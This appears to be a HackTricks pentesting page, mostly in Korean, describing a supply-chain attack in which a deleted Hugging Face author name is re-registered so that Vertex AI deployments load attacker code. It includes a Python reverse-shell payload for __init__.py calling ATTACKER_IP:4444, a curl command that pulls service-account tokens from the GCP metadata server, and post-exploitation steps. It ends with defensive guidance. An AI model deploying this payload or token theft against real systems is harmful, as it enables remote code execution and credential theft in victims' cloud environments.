# GCP - Vertex AI Post-Exploitation via Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## 시나리오

- Vertex AI Model Garden은 많은 Hugging Face (HF) 모델을 직접 배포할 수 있습니다.
- HF 모델 식별자는 Author/ModelName입니다. HF의 author/org가 삭제되면 동일한 author 이름을 누구나 재등록할 수 있습니다. 공격자는 그런 다음 legacy path에 동일한 ModelName으로 repo를 생성할 수 있습니다.
- 이름만으로(pinning이나 무결성 검증 없이) 가져오는 Pipelines, SDKs, 또는 cloud catalogs는 공격자 제어의 repo를 가져옵니다. 모델이 배포되면 해당 repo의 loader code가 Vertex AI endpoint 컨테이너 내부에서 실행되어 endpoint의 권한으로 RCE를 발생시킬 수 있습니다.

HF에서 흔한 두 가지 takeover 사례:
- 소유권 삭제(Ownership deletion): 이전 경로가 404를 반환하며 누군가 author를 재등록하고 동일한 ModelName을 게시할 때까지 404 상태입니다.
- 소유권 이전(Ownership transfer): HF는 이전 Author/ModelName에서 새 소유자에게 307 리다이렉트를 발행합니다. 이후 이전 author가 삭제되고 공격자가 재등록하면 리다이렉트 체인이 깨지며 공격자의 repo가 legacy path에서 제공됩니다.

## 재사용 가능한 네임스페이스 파악 (HF)

- 이전 author가 삭제된 경우: author 페이지가 404를 반환합니다; 모델 경로는 takeover가 발생할 때까지 404를 반환할 수 있습니다.
- 이전에 이전된 모델(Transferred models): 이전 모델 경로는 이전 author가 존재하는 동안 새 소유자에게 307을 발행합니다. 이후 이전 author가 삭제되고 재등록되면 legacy path가 공격자의 repo로 해석됩니다.

curl로 빠르게 확인:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Vertex AI에 대한 엔드 투 엔드 공격 흐름

1) Model Garden에서 'deployable'로 표시된 재사용 가능한 모델 네임스페이스를 찾는다:
- Vertex AI Model Garden에서 여전히 “verified deployable”로 표시되는 HF 모델을 찾는다.
- HF에서 원래 작성자가 삭제되었는지, 또는 모델이 transferred되어 이전 작성자가 이후에 제거되었는지 확인한다.

2) 삭제된 작성자를 HF에 다시 등록하고 동일한 ModelName을 재생성한다.

3) 악성 repo를 게시한다. 모델 로드 시 실행되는 코드를 포함시킨다. HF 모델 로드 중 흔히 실행되는 예:
- repo의 __init__.py에 있는 부작용
- config/auto_map에서 참조되는 custom modeling_*.py 또는 처리 코드
- Transformers 파이프라인에서 trust_remote_code=True를 필요로 하는 코드 경로

4) 레거시 Author/ModelName의 Vertex AI 배포가 이제 공격자 repo를 가져온다. 로더는 Vertex AI endpoint 컨테이너 내부에서 실행된다.

5) 페이로드는 endpoint 환경에서(RCE) endpoint의 권한으로 접근을 확보한다.

Example payload fragment executed on import (for demonstration only):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
참고
- 실제 로더는 다양합니다. 많은 Vertex AI HF 통합은 모델의 config에 참조된 repo 모듈(예: auto_map)을 clone 및 import하며, 이는 code execution을 유발할 수 있습니다. 일부 사용 사례에서는 trust_remote_code=True가 필요합니다.
- endpoint는 일반적으로 제한된 범위의 전용 컨테이너에서 실행되지만, 데이터 접근 및 GCP 내 횡적 이동을 위한 유효한 초기 발판이 될 수 있습니다.

## Post-Exploitation Tips (Vertex AI Endpoint)

Once code is running inside the endpoint container, consider:
- 자격증명/토큰을 위해 환경 변수와 메타데이터 열거
- 연결된 스토리지 또는 마운트된 모델 아티팩트에 접근
- 서비스 계정 신원으로 Google APIs와 상호작용 (Document AI, Storage, Pub/Sub 등)
- 플랫폼이 repo를 다시 pull하면 모델 아티팩트에 지속성 확보

접근 가능하면 인스턴스 메타데이터를 열거하세요 (컨테이너에 따라 다름):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Vertex AI 사용자를 위한 방어 지침

- HF loaders에서 commit 단위로 모델을 Pin하여 알림 없이 교체되는 것을 방지하세요:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- 검증된 HF 모델을 신뢰할 수 있는 내부 아티팩트 스토어/레지스트리에 미러링하고 그곳에서 배포하세요.
- 코드베이스와 configs를 지속적으로 스캔하여 삭제되었거나 이전된 하드코딩된 Author/ModelName을 찾아 새 네임스페이스로 업데이트하거나 커밋으로 고정하세요.
- Model Garden에서 배포 전에 모델 출처와 작성자 존재 여부를 확인하세요.

## 인식 휴리스틱 (HTTP)

- 삭제된 작성자: 작성자 페이지 404; 인수(takeover) 전까지 이전(legacy) 모델 경로가 404를 반환합니다.
- 이전된 모델: 이전(legacy) 경로가 기존 작성자가 존재하는 동안 새 작성자로 307(리다이렉트)됨; 만약 기존 작성자가 이후 삭제되고 재등록되면 이전 경로가 공격자 콘텐츠를 제공할 수 있습니다.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## 교차 참조

- 더 광범위한 방법론 및 공급망 관련 메모를 참조하세요:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## 참고자료

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
